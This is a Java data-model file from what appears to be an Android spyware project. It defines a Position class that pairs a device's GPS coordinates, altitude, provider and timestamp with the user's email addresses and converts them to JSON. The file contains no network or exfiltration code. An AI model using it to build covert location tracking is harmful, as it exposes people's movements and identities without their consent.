package android.spyware.model;

import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import static android.spyware.Spyware.TAG;

/**
 * Copyright (C) 2015 Alexandre Teyar
 * <p>
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * <p>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 **/

public class Position {
    private float        accuracy;
    private double       altitude;
    private Date         date;
    private List<String> email_addresses;
    private double       latitude;
    private double       longitude;
    private String       provider;

    public Position(float accuracy, double altitude, Date date, List<String> email_addresses, double latitude, double longitude, String provider) {
        this.accuracy = accuracy;
        this.altitude = altitude;
        this.date = date;
        this.email_addresses = email_addresses;
        this.latitude = latitude;
        this.longitude = longitude;
        this.provider = provider.toUpperCase();
    }

    public JSONObject toJSON() {
        JSONObject JSONPosition = new JSONObject();

        try {
            JSONPosition.put("accuracy", this.accuracy);
            JSONPosition.put("altitude", this.altitude);
            JSONPosition.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(this.date));
            JSONPosition.put("email_adresses", new JSONArray(this.email_addresses));
            JSONPosition.put("latitude", this.latitude);
            JSONPosition.put("longitude", this.longitude);
            JSONPosition.put("provider", this.provider);
        } catch (JSONException ex) {
            Log.wtf(TAG, Position.class.getName() + "->toJSON: " + Log.getStackTraceString(ex));
        }

        return JSONPosition;
    }
}
